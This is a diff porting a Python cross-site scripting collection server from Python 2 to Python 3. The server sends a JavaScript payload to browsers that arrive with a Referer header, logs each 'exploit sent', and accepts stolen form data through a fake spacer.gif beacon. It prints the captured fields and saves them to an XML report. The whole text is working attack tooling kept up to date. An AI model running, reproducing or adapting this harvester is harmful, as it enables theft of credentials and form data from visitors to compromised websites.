@@ -17,11 +17,11 @@
 # Proper HTTP Referers must be sent by the victim. If this is spoofed, or disabled, there will be odd results.
 
 # Requirements - Everything below this line
-import urllib2,BeautifulSoup,urlparse,datetime,re
+import BeautifulSoup,urllib.parse,datetime,re, urllib.request, urllib.error
 from xml.dom import minidom
 from xml.etree import ElementTree
 from xml.etree.ElementTree import Element, SubElement
-from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 
 # Interface you want to bind to
@@ -41,24 +41,24 @@ class RequestHandler(BaseHTTPRequestHandler):
 				
 				
 				if self.path == '/':
-					print '[-] Incoming connection from %s' % self.client_address[0]
+					print(('[-] Incoming connection from %s' % self.client_address[0]))
 					self.send_response(200) 
 					self.send_header('Content-Type', 'text/javascript')	
 					self.send_header('Cache-Control', 'no-cache, must-revalidate')
 					self.end_headers()
 					
-					print '[-] Grabbing payload from %s' % self.headers["Referer"]
+					print(('[-] Grabbing payload from %s' % self.headers["Referer"]))
 					self.prep_payload()
 					
 					self.wfile.write(self.send_payload())
 					
-					print '[-] Exploit sent to %s' % self.client_address[0]
+					print(('[-] Exploit sent to %s' % self.client_address[0]))
 				elif self.path[0:11] == '/spacer.gif':
-					print '[*] Rceiving data from %s' % self.client_address[0]
+					print(('[*] Rceiving data from %s' % self.client_address[0]))
 					self.referer_host = self.headers["Referer"].replace("https://","").replace("http://","")
 					self.referer_host = self.referer_host.split("/")[0].split(".")
 					self.referer_host = self.referer_host[-2]+"."+self.referer_host[-1]
-					print self.referer_host
+					print(self.referer_host)
 					self.send_response(200)
 					self.send_header('Content-Type', 'image/gif')
 					self.send_header('Cache-Control', 'no-cache, must-revalidate')
@@ -68,12 +68,12 @@ class RequestHandler(BaseHTTPRequestHandler):
 				
 			else:
 				#self.headers["Referer"] = "http://google.com/"
-				print '[-] Incoming connection from %s' % self.client_address[0]
-				print '[!] No referer'
+				print(('[-] Incoming connection from %s' % self.client_address[0]))
+				print ('[!] No referer')
 		except KeyError:
 			#self.headers["Referer"] = "http://google.com/"
-			print '[-] Incoming connection from %s' % self.client_address[0]
-			print '[!] No referer'
+			print(('[-] Incoming connection from %s' % self.client_address[0]))
+			print ('[!] No referer')
 
 	def send_payload(self):
 		return self.payload
@@ -139,7 +139,7 @@ class RequestHandler(BaseHTTPRequestHandler):
 		self.payload = full_payload
 		
 	def served(self):
-		t = urllib2.urlopen(self.headers["Referer"])
+		t = urllib.request.urlopen(self.headers["Referer"])
 		html = t.read()
 		soup = BeautifulSoup.BeautifulSoup(html)
 		body = soup.find(["body"])
@@ -157,7 +157,7 @@ class RequestHandler(BaseHTTPRequestHandler):
 		meta['referer'] = [self.headers["Referer"]]
 		
 		
-		print "[+] Generating XML.."
+		print ("[+] Generating XML..")
 		
 		root = Element('XSS')
 		root.set('version', '1.0')
@@ -173,7 +173,7 @@ class RequestHandler(BaseHTTPRequestHandler):
 		
 		
 		metaData = SubElement(request, 'meta')
-		for key, value in meta.iteritems():
+		for key, value in meta.items():
 			ele = SubElement(metaData, key)
 			#print value
 			ele.text = value[0]
@@ -181,11 +181,11 @@ class RequestHandler(BaseHTTPRequestHandler):
 		
 		formData = SubElement(request, 'formData')
 		
-		print '[*] Data received:'
-		for key, value in dict.iteritems():
+		print ('[*] Data received:')
+		for key, value in dict.items():
 			if key == "":
 				key = "UNDEFINED"
-			print '[-] \t '+ str(key)+' => '+str(value)
+			print(('[-] \t '+ str(key)+' => '+str(value)))
 			ele = SubElement(formData, key)
 			ele.text = value[0]
 		
@@ -206,10 +206,10 @@ class RequestHandler(BaseHTTPRequestHandler):
 		report.write(data)
 		report.close
 
-print "Starting server on %s:%s...\n" % (bind,port)
+print(("Starting server on %s:%s...\n" % (bind,port)))
 try:
 	serv = HTTPServer((bind, port), RequestHandler)
-	print "[*] Server has started"
+	print ("[*] Server has started")
 	serv.serve_forever()
 except:
-	print "Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port)
+	print(("Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port)))
